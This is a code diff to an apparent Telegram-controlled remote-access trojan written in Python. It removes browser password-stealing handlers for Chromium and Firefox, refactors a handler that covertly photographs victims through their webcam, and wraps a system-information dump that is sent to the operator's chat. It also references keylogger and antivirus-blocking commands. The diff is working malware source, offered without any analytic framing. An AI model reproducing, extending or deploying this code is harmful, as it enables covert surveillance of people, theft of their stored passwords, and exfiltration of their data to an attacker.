@@ -27,7 +27,7 @@ from libs.system_info import get_systeminfo as systinfo
 
 #REDIS CONF
 REDIS_HOST = ""
-REDIS_PORT = 0000 #PORT GOES HERE
+REDIS_PORT = 0 #PORT GOES HERE
 REDIS_PASS = ""
 
 #TELEGRAM CONF
@@ -725,98 +725,8 @@ async def handle_stop_keylogger(data, *args):
     else:
         await send_message(NOTIFY_CHATID, "No keylogger logs available to send.")
 
-@command_handler("/list_cameras")
-async def handle_list_cameras(data, *args):
-    """Handle /list_cameras command to list available cameras."""
-    
-    if not os.path.exists(camera_exe_path):
-        await send_message(NOTIFY_CHATID, f"Downloading necessary function.")
-    try:
-        camera_exe = ensure_camera_executable()
-        result = subprocess.run([camera_exe, "list"], capture_output=True, text=True)
-        if result.returncode == 0:
-            await send_message(NOTIFY_CHATID, f"Available Camera Index:\n{result.stdout.strip()}")
-        else:
-            await send_message(NOTIFY_CHATID, f"Error listing cameras:\n{result.stderr.strip()}")
-    except Exception as e:
-        await send_message(NOTIFY_CHATID, f"Error: {e}")
-
-@command_handler("/steal_chromium")
-async def handle_steal_chromium(data, *args):
-    
-    
-    if not os.path.exists(chromium_exe_path):
-        await send_message(NOTIFY_CHATID, f"Downloading necessary function.")
-    try:
-        ensure_chromium_executable()
-        chromium_exe = chromium_exe_path
-        print(chromium_exe_path)
-        result = subprocess.run([chromium_exe], capture_output=True, text=True)
-        if result.returncode == 0:
-            await send_document(NOTIFY_CHATID, result.stdout.strip())
-        else:
-            await send_message(NOTIFY_CHATID, f"Error grabbing:\n{result.stderr.strip()}")
-    except Exception as e:
-        await send_message(NOTIFY_CHATID, f"Error: {e}")
-
-@command_handler("/list_firefox")
-async def handle_list_firefox(data, *args):
-    
-    
-    if not os.path.exists(firefox_exe_path):
-        await send_message(NOTIFY_CHATID, f"Downloading necessary function.")
-    try:
-        firefox_exe = ensure_firefox_executable()
-        result = subprocess.run([firefox_exe, '-l'], capture_output=True, text=True)
-        if result.returncode == 0:
-            await send_message(NOTIFY_CHATID, result.stdout.strip())
-        else:
-            await send_message(NOTIFY_CHATID, f"Error grabbing:\n{result.stderr.strip()}")
-    except Exception as e:
-        await send_message(NOTIFY_CHATID, f"Error: {e}")
-
-
-@command_handler("/steal_firefox")
-async def handle_steal_firefox(data, *args):
-    
-
-    if len(args) != 1:
-        await send_message(NOTIFY_CHATID, 'Usage: /steal_firefox <profile_no (use /list_firefox to find)>')
-        return
-
-    
-
-    if not os.path.exists(firefox_exe_path):
-        await send_message(NOTIFY_CHATID, f"Downloading necessary function.")
-    try:
-        firefox_exe = ensure_firefox_executable()
-        result = subprocess.run([firefox_exe, '-n', '-c', args[0]], capture_output=True, text=True)
-        if result.returncode == 0:
-
-            with tempfile.NamedTemporaryFile(mode="wt", suffix=".txt", delete=False) as f:
-                f.write(result.stdout.strip())
-                psswd_file = f.name
-                f.close()
-
-            await send_document(NOTIFY_CHATID, psswd_file)
-        else:
-            await send_message(NOTIFY_CHATID, f"Error grabbing:\n{result.stderr.strip()}")
-    except Exception as e:
-        await send_message(NOTIFY_CHATID, f"Error: {e}")
-
-
-
-@command_handler("/capture_webcam")
-async def handle_capture_image(data, *args):
-    """Handle /capture_image command to capture an image from a camera."""
-    
-    if not os.path.exists(camera_exe_path):
-        await send_message(NOTIFY_CHATID, f"Downloading necessary function.")
-    camera_index = 0  # Default to the first camera
-
-    if args and args[0].isdigit():
-        camera_index = int(args[0])
-
+def capture_image(camera_index=0):
+    """Capture an image from the specified camera index."""
     try:
         camera_exe = ensure_camera_executable()
         result = subprocess.run(
@@ -826,16 +736,36 @@ async def handle_capture_image(data, *args):
         )
         if result.returncode == 0:
             image_path = result.stdout.strip()
-
             if os.path.exists(image_path):
-                try:
-                    await send_document(NOTIFY_CHATID, image_path)
-                finally:
-                    os.remove(image_path)  # Clean up the temporary file
+                return image_path
             else:
-                await send_message(NOTIFY_CHATID, f"Error: {image_path}")
+                raise FileNotFoundError(f"Image file not found at {image_path}")
         else:
-            await send_message(NOTIFY_CHATID, f"Error capturing image:\n{result.stderr.strip()}")
+            raise Exception(f"Camera capture failed: {result.stderr.strip()}")
+    except Exception as e:
+        raise Exception(f"Error capturing image: {e}")
+
+@command_handler("/capture_webcam")
+async def handle_capture_webcam(data, *args):
+    """Capture an image using the webcam."""
+    camera_index = int(args[0]) if args and args[0].isdigit() else 0
+    try:
+        image_path = capture_image(camera_index)
+        await send_document(NOTIFY_CHATID, image_path)
+        os.remove(image_path)  # Clean up temporary file
+    except Exception as e:
+        await send_message(NOTIFY_CHATID, f"Error capturing image: {e}")
+
+@command_handler("/list_cameras")
+async def handle_list_cameras(data, *args):
+    """List available cameras."""
+    try:
+        camera_exe = ensure_camera_executable()
+        result = subprocess.run([camera_exe, "list"], capture_output=True, text=True)
+        if result.returncode == 0:
+            await send_message(NOTIFY_CHATID, f"Available Cameras:\n{result.stdout.strip()}")
+        else:
+            await send_message(NOTIFY_CHATID, f"Error listing cameras: {result.stderr.strip()}")
     except Exception as e:
         await send_message(NOTIFY_CHATID, f"Error: {e}")
 
@@ -941,7 +871,12 @@ async def handle_change_wallpaper(data, *args):
 
 @command_handler("/sys_info")
 async def handle_sysinfo(data, *args):
-    await send_markdown(NOTIFY_CHATID, systinfo())
+    """Get and send system information."""
+    try:
+        info = systinfo()  # Ensure `systinfo` returns a detailed system report.
+        await send_markdown(NOTIFY_CHATID, f"System Information:\n```\n{info}\n```")
+    except Exception as e:
+        await send_message(NOTIFY_CHATID, f"Error fetching system information: {e}")
 
 
 @command_handler("/block_av")
